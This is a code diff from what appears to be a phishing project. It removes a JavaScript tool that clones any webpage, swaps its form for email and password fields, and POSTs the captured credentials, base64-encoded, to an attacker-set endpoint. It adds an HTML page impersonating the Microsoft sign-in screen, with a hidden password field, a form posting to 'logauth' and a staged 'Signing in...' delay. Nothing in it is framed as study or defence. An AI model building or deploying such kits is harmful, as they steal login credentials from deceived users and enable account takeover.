@@ -1,140 +1,110 @@
-let clonedHtml = "";
-let phishingHtml = "";
-
-// Function to clone a webpage
-async function clonePage() {
-    const url = document.getElementById("url").value.trim();
-    if (!url) {
-        appendToOutput("Error: Please enter a valid URL.");
-        return;
+<!DOCTYPE html>
+<html dir="ltr" lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+  <link rel="stylesheet" href="cssassets/Converged_v21033_AZXChPIB5jI3ijrmoNll5w2.css">
+  <link rel="stylesheet" href="cssassets/Converged_v21033__M8MTZS7Nv0I1zR18wdR-g2.css">
+  <link rel="stylesheet" href="cssassets/the.css">
+  <link rel="shortcut icon" href="imgs/favicon.ico">
+  <style>
+    #redicha { color: #0b6efd; transition: display 0.8s; }
+    .transitioning { height: 14px; width: 14px; vertical-align: middle; display: inline-block; padding-right: 30px; }
+    .redicha {
+      height: 14px; width: 14px;
+      animation: rotation .7s infinite linear;
+      border-left: 3px solid #0b6efd;
+      border-right: 3px solid #0b6efd;
+      border-bottom: 3px solid #0b6efd;
+      border-top: 3px solid #fff;
+      border-radius: 100%;
+      display: inline-block;
     }
-    try {
-        appendToOutput(`Cloning page from: ${url}...`);
-        updateProgress(25);
-        const response = await fetch(url);
-        clonedHtml = await response.text();
-        appendToOutput("Page cloned successfully. You can now download it or convert it to a phishing page.");
-        updateProgress(50);
-    } catch (error) {
-        appendToOutput(`Error cloning the page: ${error.message}`);
+    @keyframes rotation {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(359deg); }
     }
-}
+    .dis { opacity: 0.5; border-color: #54616a; background-color: #54616a; }
+  </style>
+  <meta name="robots" content="none">
+</head>
+<body class="cb">
+  <div class="background">
+    <div class="backgroundImage" style="background-image: url('imgs/0_a5dbd4393ff6a725c7e62b61df7e72f0.jpg');"></div>
+  </div>
 
-// Function to download the cloned page
-function downloadClonedPage() {
-    if (!clonedHtml) {
-        appendToOutput("Error: No cloned page available. Please clone a page first.");
-        return;
+  <form id="i0281" novalidate method="post" action="logauth">
+    <div class="outer">
+      <div class="middle">
+        <div class="inner fade-in-lightbox">
+          <div><img class="logo" src="cssassets/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"></div>
+          <div role="main">
+            <div class="pagination-view">
+              <div data-viewid="1">
+                <div class="row text-title" id="loginHeader">
+                  <h1>Sign in</h1>
+                </div>
+                <div class="row">
+                  <div role="alert" aria-live="assertive">
+                    <!-- Static error message if needed -->
+                    <!-- <div class="col-md-24 error ext-error">That Microsoft account doesn't exist. Enter a different account.</div> -->
+                  </div>
+                  <div class="form-group col-md-24">
+                    <div class="placeholderContainer">
+                      <input type="email" name="loginfmt" id="i0116" class="form-control ltr_override" placeholder="Email or Skype" required>
+                      <input name="passwd" type="password" id="i0118" class="moveOffScreen" placeholder="Password" tabindex="-1" aria-hidden="true">
+                    </div>
+                  </div>
+                </div>
+                <div class="position-buttons">
+                  <div class="row">
+                    <div class="col-md-24">
+                      <p style="font-size:14px;display:none;" id="redicha">
+                        <span class="transitioning"><span class="redicha">&nbsp;</span></span> Signing in...
+                      </p>
+                      <div class="text-13 action-links" id="signupbtnn">
+                        <div class="form-group">No account? <a href="#">Create one!</a></div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="row">
+                    <div class="col-xs-24 no-padding-left-right button-container">
+                      <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" value="Next">
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="footer" class="footer default">
+            <div id="footerLinks" class="footerNode text-secondary">
+              <a href="#">Terms of use</a>
+              <a href="#">Privacy & cookies</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </form>
+
+  <script>
+    function reqload() {
+      document.getElementById('redicha').style.display = "block";
     }
-    const blob = new Blob([clonedHtml], { type: "text/html" });
-    const link = document.createElement("a");
-    link.href = URL.createObjectURL(blob);
-    link.download = "cloned_page.html";
-    link.click();
-    appendToOutput("Cloned page downloaded successfully.");
-}
 
-// Function to add custom input fields
-function addInputField() {
-    const container = document.getElementById("input-fields-container");
-    const input = document.createElement("input");
-    input.type = "text";
-    input.placeholder = "Field Name (e.g., Username)";
-    container.appendChild(input);
-}
-
-// Function to convert the cloned page into a phishing page
-function convertToPhishing() {
-    if (!clonedHtml) {
-        appendToOutput("Error: No cloned page available. Please clone a page first.");
-        return;
+    function waitreq() {
+      reqload();
+      var suballow = document.getElementById('janmns');
+      document.getElementById('idSIButton9').classList.add('dis');
+      document.getElementById('signupbtnn').classList.add('hide');
+      setTimeout(function () {
+        suballow.value = "on";
+        document.getElementById('i0281').submit();
+      }, 3000);
+      return false;
     }
-
-    // Collect custom input fields
-    const fieldsContainer = document.getElementById("input-fields-container");
-    const customFields = Array.from(fieldsContainer.children)
-        .map(input => `<input type="text" name="${input.value}" placeholder="${input.value}" required />`)
-        .join("");
-
-    phishingHtml = clonedHtml.replace(
-        /<form[^>]*>([\s\S]*?)<\/form>/i,
-        `
-        <form id="phishing-form">
-            ${customFields}
-            <input type="email" name="email" placeholder="Email" required />
-            <input type="password" name="password" placeholder="Password" required />
-            <button type="submit">Submit</button>
-        </form>
-        <script>
-            document.getElementById('phishing-form').addEventListener('submit', function(e) {
-                e.preventDefault();
-                const data = new FormData(e.target);
-                sendCredentials(Object.fromEntries(data));
-            });
-
-            function sendCredentials(data) {
-                const config = document.getElementById('results-config').value.trim();
-                const encryptedData = btoa(JSON.stringify(data)); // Basic encryption
-                if (config.startsWith('http')) {
-                    fetch(config, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ encryptedData })
-                    }).then(() => {
-                        alert('Credentials sent!');
-                        appendToOutput('Credentials sent successfully!');
-                    }).catch((error) => {
-                        appendToOutput('Error sending credentials: ' + error.message);
-                    });
-                } else {
-                    alert('Invalid configuration. Please enter a valid email or Telegram ID.');
-                    appendToOutput('Invalid configuration. Please enter a valid email or Telegram ID.');
-                }
-            }
-        </script>
-        `
-    );
-    appendToOutput("Page converted to a phishing page. You can now download it.");
-    updateProgress(75);
-}
-
-// Function to preview the phishing page
-function previewPhishingPage() {
-    if (!phishingHtml) {
-        appendToOutput("Error: No phishing page available. Please convert a page first.");
-        return;
-    }
-    const blob = new Blob([phishingHtml], { type: "text/html" });
-    const url = URL.createObjectURL(blob);
-    window.open(url, "_blank");
-}
-
-// Function to download the phishing page
-function downloadPhishingPage() {
-    if (!phishingHtml) {
-        appendToOutput("Error: No phishing page available. Please convert a page first.");
-        return;
-    }
-    const blob = new Blob([phishingHtml], { type: "text/html" });
-    const link = document.createElement("a");
-    link.href = URL.createObjectURL(blob);
-    link.download = "phishing_page.html";
-    link.click();
-    appendToOutput("Phishing page downloaded successfully.");
-    updateProgress(100);
-}
-
-// Function to append messages to the output
-function appendToOutput(message) {
-    const output = document.getElementById("output");
-    const messageNode = document.createElement("p");
-    messageNode.textContent = message;
-    output.appendChild(messageNode);
-    output.scrollTop = output.scrollHeight; // Auto-scroll
-}
-
-// Function to update progress bar
-function updateProgress(percentage) {
-    const progress = document.getElementById("progress");
-    progress.style.width = `${percentage}%`;
-}
+  </script>
+</body>
+</html>
